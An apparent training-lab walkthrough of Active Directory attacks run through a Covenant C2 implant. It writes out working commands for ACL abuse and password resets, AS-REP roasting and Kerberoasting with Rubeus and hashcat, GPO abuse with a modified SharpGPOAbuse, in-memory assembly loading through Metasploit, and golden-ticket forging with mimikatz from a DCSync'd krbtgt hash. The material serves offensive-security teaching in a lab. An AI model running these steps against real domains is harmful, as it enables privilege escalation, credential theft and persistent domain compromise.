<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image165.png" srcset="/img/loading.gif"></p>
<h2 id="Exploiting-Misconfigured-ACLs"><a href="#Exploiting-Misconfigured-ACLs" class="headerlink" title="Exploiting Misconfigured ACLs"></a>Exploiting Misconfigured ACLs</h2><p>In case you have a GenericAll permission on a user, you can:</p>
<ul>
<li><p>  Set a SPN on behalf of that user and crack it (stealthy method)</p>
</li>
<li><p>  Change his password and log in as that user (not stealthy but immediate access is given)</p>
</li>
<li><p>  <strong>Force-ChangePassword privilege</strong> can also allow you to change the password of a user</p>
</li>
</ul>
<p>In case you have a <strong>GenericAll</strong> permission on a Group, <strong>Write permission, Write-Owner</strong> permission or <strong>Self</strong> permission, you can</p>
<ul>
<li>  Add yourself to this group, and as a result obtain the privileges that this group possesses.</li>
</ul>
<p>For example, in order to retrieve more details on ExtendedRight, you can prepare following PowerView query:</p>
<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">Get-ObjectAcl</span> <span class="hljs-literal">-SamAccountName</span> service_user2 <span class="hljs-literal">-ResolveGUIDs</span> | ? &#123;<span class="hljs-variable">$_</span>.IdentityReference <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;ELS-CHILD\analyst1&quot;</span>&#125;<br></code></pre></div></td></tr></table></figure>

<p>In that query we want to list all properties of the service_user2 that analyst1 can access.</p>
<p>Among the outputted data you can find some less important results like the below one.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image166.png" srcset="/img/loading.gif"></p>
<p>But interesting data are also included there.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image167.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image168.png" srcset="/img/loading.gif"></p>
<p>Using the Change password permission, we can change the service_user2 password. As usual, we can do it using command (Use a grunt as Analyst1)</p>
<figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">powershell net <span class="hljs-keyword">user</span> <span class="hljs-title">service_account2</span> Password2020$ /domain<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image169.png" srcset="/img/loading.gif"></p>
<p>Exploitation of user attributes can also be conducted via setting a pre-authentication possibility for a user on which we have generic all, write, or write attribute permission.</p>
<p><strong>Note: In current exercise we will also make use of dev-branch of PowerView, as it has extended functionalities to manipulate user attributes and browse ACLScanner output, which is required in this exercise. It can be downloaded from…</strong></p>
<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1</a></p>
<p>…and imported using the PowerShellImport task.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image170.png" srcset="/img/loading.gif"></p>
<p>If we run the command:</p>
<figure class="highlight mathematica"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mathematica"><span class="hljs-variable">powershell</span> <span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">DomainUser</span> <span class="hljs-operator">-</span><span class="hljs-variable">PreauthNotRequired</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Verbose</span><br></code></pre></div></td></tr></table></figure>

<p>We will notice in the output a user who is asreproast-able.</p>
<p>Now, let’s take an example of a user whose attributes can be controlled by analyst1. The below command will be used for such an enumeration.</p>
<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">Invoke-ACLScanner</span> <span class="hljs-literal">-ResolveGUIDs</span> | ?&#123;<span class="hljs-variable">$_</span>.IdentityReferenceName <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;Analyst1&quot;</span>&#125;<br></code></pre></div></td></tr></table></figure>

<p>We can see that one of the users we can modify is victim.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image171.png" srcset="/img/loading.gif"></p>
<p>Now, let’s set preauthentication to on by modifying the useraccountcontrol attribute value. Due to XOR’s nature, the operation of enabling pre-authentication is fully reversible (which makes it stealthier) - as you can enable the preauthentication, conduct asreproasting and then restore the user’s attributes back to original state. We will proceed accordingly to that scenario:</p>
<figure class="highlight coq"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coq">powershell <span class="hljs-keyword">Set</span>-DomainObject -<span class="hljs-keyword">Identity</span> analystm2 -XOR @&#123;useraccountcontrol=<span class="hljs-number">4194304</span>&#125; -<span class="hljs-keyword">Verbose</span><br></code></pre></div></td></tr></table></figure>

<p>is used to change the useraccountcontrol attribute.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image172.png" srcset="/img/loading.gif"></p>
<figure class="highlight mathematica"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mathematica"><span class="hljs-variable">powershell</span> <span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">DomainUser</span> <span class="hljs-operator">-</span><span class="hljs-variable">PreauthNotRequired</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Identity</span> <span class="hljs-variable">analystm2</span><br></code></pre></div></td></tr></table></figure>

<p>is used to verify if the user is asreproastable at the moment, using the command “Rubeus asreproast”</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image173.png" srcset="/img/loading.gif"></p>
<p>When it is, Rubeus is used to obtain the hash. At the end, the user attribute is restored to original state.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image174.png" srcset="/img/loading.gif"></p>
<p>The hash can be later cracked using hashcat, revealing the password Spring2020!</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">hashcat -m 18200 asrep.txt rockyou2.txt <br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image175.png" srcset="/img/loading.gif"></p>
<h2 id="Using-Invoke-ACLScanner-along-with-Bloodhound"><a href="#Using-Invoke-ACLScanner-along-with-Bloodhound" class="headerlink" title="Using Invoke-ACLScanner along with Bloodhound"></a>Using Invoke-ACLScanner along with Bloodhound</h2><p>Let’s then use acl scanner and try to exploit some relationships between groups and users. From an initial check we can see that lots of these relationships are from user analyst1 but also analyst3 or the group operators.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image176.png" srcset="/img/loading.gif"></p>
<p>For example, analyst1 has a GenericAll access to user service_user2</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image177.png" srcset="/img/loading.gif"></p>
<p>The same applies to user Analyst Manager</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image178.png" srcset="/img/loading.gif"></p>
<p>Also, analyst3 has ExtendedRights over analyst manager.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image179.png" srcset="/img/loading.gif"></p>
<p>Analyst2 has ExtendedRight over Analyst Manager 2</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image180.png" srcset="/img/loading.gif"></p>
<p>etc. There are more attack paths which you can spot by studying the output.</p>
<h2 id="GPO-Abuse"><a href="#GPO-Abuse" class="headerlink" title="GPO Abuse"></a>GPO Abuse</h2><p>The ability to modify Domain Policy might result in escalating privileges including getting Domain Administrator-level access. During domain reconnaissance it is important to identify potential vulnerable GPOs. GPOs which we are interested in are typically those, that are modifiable by us. It is very likely, that upon getting some level of access within the targeted domain we will be able to obtain credentials which belong to a domain user who is able to modify a Domain Policy. We will try to identify and exploit vulnerable GPOs in the below example.</p>
<p>Our starting point will be a Covenant grunt established from Jumpbox machine in context of the Analyst1 user.</p>
<p>Our first task will be to import PowerView using the PowerShellImport task. That task has been already presented several times. When PowerView is imported, we can issue a Get-NetGPO command to verify which policies are applied within our domain.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image181.png" srcset="/img/loading.gif"></p>
<p>In the current case, we can see a “test” domain policy, also in the full output we can observe its details:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image182.png" srcset="/img/loading.gif"></p>
<p>For full details we can use the command:</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">powershell.exe <span class="hljs-keyword">Get</span>-NetGPO | %&#123;<span class="hljs-keyword">Get</span>-ObjectAcl -ResolveGUIDs -<span class="hljs-type">Name</span> $_.Name&#125;<br></code></pre></div></td></tr></table></figure>

<p>We can observe that the Authenticated users have permission to modify the GPO. This is a very powerful exploit primitive which might lead to domain compromise.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image183.png" srcset="/img/loading.gif"></p>
<p>The scenarios for exploiting the GPOs rely on pushing some instructions which will be executed on objects that the policy is related to. One of popular option is to create an “immediate task” which will create a scheduled task under the domain administrator context.</p>
<p>In order to automate the exploitation process we will use Covenant together with SharpGPOAbuse.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/FSecureLABS/SharpGPOAbuse">https://github.com/FSecureLABS/SharpGPOAbuse</a></p>
<p>You should download the solution and compile it as .NET version 4.0 which can be set up in Project Application -&gt; Target platform.</p>
<p>There are two files produced: SharpGPOAbuse.exe and CommandLine.dll</p>
<p>In step first, we can merge together the binary and CommandLine.dll into one file. We can do it using the ILMerge tool. It can be installed by going to Visual Studio -&gt; Manage Nuget Packages -&gt; NuGet console -&gt; issue command</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Install</span>-Package ilmerge -Version <span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">29</span><br></code></pre></div></td></tr></table></figure>

<p>It is later accessible in the project directory, in our case it was</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\(</span>…)<span class="hljs-symbol">\S</span>harpGPOAbuse-master<span class="hljs-symbol">\S</span>harpGPOAbuse-master<span class="hljs-symbol">\p</span>ackages<span class="hljs-symbol">\I</span>LMerge.3.0.29<span class="hljs-symbol">\t</span>ools<span class="hljs-symbol">\n</span>et452<br></code></pre></div></td></tr></table></figure>

<p>Execute a command-line terminal and move both files (SharpGPOAbuse.exe and CommandLine.dll) into the ILMerge’s directory. Then, issue the command:</p>
<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ILMerge</span>.</span></span>exe /out:<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SharpGPOAbuseMerged</span>.</span></span>exe .\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SharpGPOAbuse</span>.</span></span>exe .\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">CommandLine</span>.</span></span>dll<br></code></pre></div></td></tr></table></figure>

<p>Note: also a .pdb file will be created. If you leave that file in that directory and try to merge another binary, ILMerge will throw an error.</p>
<p>The resulting SharpGPOAbuse.exe file can be moved to the target machine and executed - but to be stealthier we will leverage Covenant’s in-memory assembly-loading features. So, before we move into actually using SharpGPOAbuse, let’s consider some in-memory .NET execution scenarios.</p>
<h2 id="In-memory-NET-execution"><a href="#In-memory-NET-execution" class="headerlink" title="In-memory .NET execution"></a>In-memory .NET execution</h2><p>Now, we will try to achieve in-memory execution of a binary launcher using Metasploit. Before we start, let’s download and set up the related Metasploit module</p>
<p><a target="_blank" rel="noopener" href="https://github.com/b4rtik/metasploit-execute-assembly">https://github.com/b4rtik/metasploit-execute-assembly</a></p>
<p>In order to use it, we will need first to prepare all components. First, we are downloading the archive and compiling the solution as x64. For the purpose of compilation we use Visual Studio 2017. The product of compilation is HostingCLRx64.dll. Now as the .dll is ready, we need to move it along with execute-assembly.rb to our Kali machine and import it to Metasploit.</p>
<p>In order to add it as a Metasploit module, we execute the following commands:</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">mkdir -p <span class="hljs-variable">$home</span>/.msf4/modules/post/windows/manage<br>mv execute-assembly.rb<br><span class="hljs-variable">$home</span>/.msf4/modules/post/windows/manage/execute_assembly.rb<br>cp hostingclrx64.dll /usr/share/metasploit-framework/data/post/hostingclrx64.dll<br></code></pre></div></td></tr></table></figure>

<p>Note that we changed the name “execute-assembly” to “execute_assembly”. This is because Metasploit complains about a requirement related to alphanumeric characters.</p>
<p>Finally, we issue a reload_all command inside the Metasploit framework console.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image184.png" srcset="/img/loading.gif"></p>
<p>We can now make use of a new module. In order to proceed further you need to pass the session to Metasploit. Our meterpreter session has ID 1.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image185.png" srcset="/img/loading.gif"></p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">msf5 post(windows<span class="hljs-regexp">/manage/</span>execute_assembly) &gt; set session <span class="hljs-number">1</span><br>msf5 post(windows<span class="hljs-regexp">/manage/</span>execute_assembly) &gt; set assembly Launcher.exe<br>msf5 post(windows<span class="hljs-regexp">/manage/</span>execute_assembly) &gt; set arguments <span class="hljs-string">&quot;-h&quot;</span><br>msf5 post(windows<span class="hljs-regexp">/manage/</span>execute_assembly) &gt; set assemblypath <span class="hljs-regexp">/root/</span><br>msf5 post(windows<span class="hljs-regexp">/manage/</span>execute_assembly) &gt; run<br></code></pre></div></td></tr></table></figure>

<p>The Metasploit module allows for in-memory .NET execution by spawning a process and injecting the .NET assembly into it. For example, we can download a Binary Launcher out of covenant and set it as Launcher.exe in the assembly option:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image186.png" srcset="/img/loading.gif"></p>
<p>Shortly, a new grunt is spawned.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image187.png" srcset="/img/loading.gif"></p>
<p>Such in-memory .NET execution can also be achieved using Covenant. We have actually practiced that already. We will combine this capability with the tool SharpGPOAbuse.exe. SharpGPOAbuse, in the shape we already prepared it, unfortunately has some compatibility issues when invoked out of Covenant. It is possible to invoke it out from memory using the Covenant task “assembly”, however you should be prepared to face some unexpected errors. In order to avoid them, we will use RastaMouse’s fork of that tool which can be found below <a target="_blank" rel="noopener" href="https://github.com/ZeroPointSecurity/SharpGPOAbuse">https://github.com/ZeroPointSecurity/SharpGPOAbuse</a></p>
<p>As per the instructions at the repository’s main page, you will need to change the source code of the assembly as it no longer requires any command line parameters. Open the .sln file in Visual Studio and go to Program.cs which contains the main function of the program. Here we will edit some variables that reflect what command line parameters are originally meant to set up.</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span><span class="hljs-params">(<span class="hljs-built_in">string</span>[] args)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// CHANGE THESE</span><br>    <span class="hljs-built_in">string</span> GPOName = <span class="hljs-string">&quot;test&quot;</span>;<br>    <span class="hljs-built_in">string</span> UserAccount = <span class="hljs-string">&quot;Analyst2&quot;</span>;<br></code></pre></div></td></tr></table></figure>

<p>And then scroll down until another //CHANGE comment is met.</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// CHANGE THIS</span><br>            <span class="hljs-comment">//StartupScript.NewStartupScript(ScriptName, ScriptContent, DomainName, DomainController, GPOName, DistinguishedName, &quot;User&quot;);</span><br>            LocalAdmin.NewLocalAdmin(UserAccount, DomainName, DomainController, <span class="hljs-string">&quot;test&quot;</span>, DistinguishedName, <span class="hljs-literal">true</span>);<br>            <span class="hljs-comment">//the last argument is the --Force switch.</span><br></code></pre></div></td></tr></table></figure>

<p>We want to change the policy “test” and in case it was already overridden e.g. by previous exploitation attempts, we set force argument to true.</p>
<p>Then, compile the solution and move the newly created SharpGPOAbuse.exe to the Kali machine. Next step will be to go to a grunt on Jumpbox and use a “Task” of name “Assembly” to load SharpGPOAbuse.exe onto Jumpbox’s grunt launcher process.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image188.png" srcset="/img/loading.gif"></p>
<p>After several seconds we can see that the policy has been updated</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image189.png" srcset="/img/loading.gif"></p>
<p>Moreover we can see in net user’s output that Analyst2 is now a member of the Administrators group</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image190.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image191.png" srcset="/img/loading.gif"></p>
<p>The same method, “Assembly” task, has already been used to load the SharpHound tool.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors">https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors</a></p>
<p>After moving it to attacker’s Kali machine it can be loaded as input to the Assembly task. <img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image192.png" srcset="/img/loading.gif"></p>
<p>After a short while the output can be seen in the tasking tab.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image193.png" srcset="/img/loading.gif"></p>
<h2 id="ASREPRoasting-and-Kerberoasting-with-Covenant"><a href="#ASREPRoasting-and-Kerberoasting-with-Covenant" class="headerlink" title="ASREPRoasting and Kerberoasting with Covenant"></a>ASREPRoasting and Kerberoasting with Covenant</h2><p>Before we jump into actual Roasting, let us show you also how these misconfigurations arise.</p>
<p>We created two domain accounts with crackable passwords.</p>
<figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">service_user</span> Welcome1! /add /domain<br>net <span class="hljs-keyword">user</span> <span class="hljs-title">service_user2</span> Welcome8! /add /domain<br></code></pre></div></td></tr></table></figure>

<p>For that domain admin access is required.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image194.png" srcset="/img/loading.gif"></p>
<p>Next, SPNs are created for these users.</p>
<p>For the purpose of later kerberoasting, we will create a SPN for service_user.</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">setspn</span> -U -S http/win<span class="hljs-number">10</span>-web service_user<br></code></pre></div></td></tr></table></figure>

<p>For the purpose of later ASREP-roasting, let’s go to ADUC (Active Directory Users and Computers)</p>
<p>And choose “Users”</p>
<p>Then find service_user2, right-click it and choose “properties”. Under “account” tab, choose “Do not require Kerberos preauthentication”</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image195.png" srcset="/img/loading.gif"></p>
<p>This way, we have introduced two misconfigurations into our environment. Note, that while ASREP can be considered an account misconfiguration, the main issue here is the weak password. If machine accounts were used for SPN’s, which have a complex, random and long password are typically not crackable using usual GPUs.</p>
<p><strong>Note: This exercise is done using a Medium integrity grunt of Analyst1 user.</strong></p>
<p>First, let’s execute</p>
<figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">Rubeus kerberoast /format<span class="hljs-selector-pseudo">:has</span>hcat<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image196.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image197.png" srcset="/img/loading.gif"></p>
<p>A hash has been received in the output. Let’s see if hashcat can handle it:</p>
<p>We save it to a text file and remove all newlines and whitespaces.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image198.png" srcset="/img/loading.gif"></p>
<p>Later on we can use hashcat to crack the obtained hash.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image199.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image200.png" srcset="/img/loading.gif"></p>
<p>In that case we already knew what kind of password we can expect, thus a precise mask attack cracked the password within seconds. In a real-life scenario we need to be lucky or utilize some hints to successfully crack user’s password.</p>
<p>A similar technique works with ASREP-roasting.</p>
<p>Go to interact and issue a command</p>
<figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">Rubeus asreproast /format<span class="hljs-selector-pseudo">:has</span>hcat<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image201.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image202.png" srcset="/img/loading.gif"></p>
<p>Then we can strip all the spaces and newlines and prepare file for cracking.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image203.png" srcset="/img/loading.gif"></p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat64</span>.exe -m <span class="hljs-number">18200</span> service_user<span class="hljs-number">2</span> -O -a <span class="hljs-number">3</span> ?u?l?l?l?l?l?l?d?s<br></code></pre></div></td></tr></table></figure>

<p>If you don’t have a really strong GPU available, that one will not give up so easily. The same mask attack on the same GPU took 6 hours to complete.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image204.png" srcset="/img/loading.gif"></p>
<p>In the case of a retrieved ASREP hash, you should count on a very weak password or have a good wordlist.</p>
<p>Based on the previous password, we were able to create a simple wordlist where just the number changes.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image205.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image206.png" srcset="/img/loading.gif"></p>
<p>However, in a real-life scenario, you should also retrieve some hints about the password or invest in a serious (like cloud-based) GPU.</p>
<h2 id="Domain-persistence-with-Golden-Ticket"><a href="#Domain-persistence-with-Golden-Ticket" class="headerlink" title="Domain persistence with Golden Ticket"></a>Domain persistence with Golden Ticket</h2><p>Golden ticket is a very popular technique, so you might want to try it. First, we need the krbtgt account’s NTLM hash. We can obtain this using DCSync. Covenant has a dedicated Task for that one:</p>
<p>(<strong>Domain Administrator user grunt on Jumpbox</strong>)</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image207.png" srcset="/img/loading.gif"></p>
<p>After a short while task is completed and we can get the krbtgt hash:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image208.png" srcset="/img/loading.gif"></p>
<p>Let’s now try to craft a golden ticket out of it and try to inject it into memory. We will need to use a local instance of mimikatz in order to generate the ticket. As already explained, a golden ticket is generated using domain SID, krbtgt NTLM hash and the domain name along with desired user ID.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image209.png" srcset="/img/loading.gif"></p>
<p>The command we use is</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">kerberos</span>::golden /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">23589937</span>-<span class="hljs-number">599888933</span>-<span class="hljs-number">351157107</span> /domain:els-child.els.local /rc<span class="hljs-number">4</span>:e<span class="hljs-number">4</span>ba<span class="hljs-number">51</span>c<span class="hljs-number">7157</span>fe<span class="hljs-number">46652603</span>b<span class="hljs-number">661</span>f<span class="hljs-number">1</span>ccfbe /user:Administrator /id:<span class="hljs-number">500</span> /file:ticket.kirbi<br></code></pre></div></td></tr></table></figure>

<p>As ticket.kirbi is generated we can copy it into our Kali machine. Then, we upload it using Upload task as c:\users\analyst1\ticket.kirbi</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image210.png" srcset="/img/loading.gif"></p>
<p>Then, we read this ticket as base64 using powershell and inject it using Rubeus which is built-in into Covenant, as follows.</p>
<figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">powershell <span class="hljs-selector-attr">[System.Convert]</span>::<span class="hljs-built_in">ToBase64String</span>([System.IO.File]::<span class="hljs-built_in">ReadAllBytes</span>(<span class="hljs-string">&quot;c:\users\analyst1\ticket.kirbi&quot;</span>))<br></code></pre></div></td></tr></table></figure>

<p>Then, we use the output with a command:</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">rubeus</span> ptt /ticket:doQA[base<span class="hljs-number">64</span>]<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image211.png" srcset="/img/loading.gif"></p>
<p>After importing the ticket, you should be able to confirm it has been imported using klist.exe.</p>
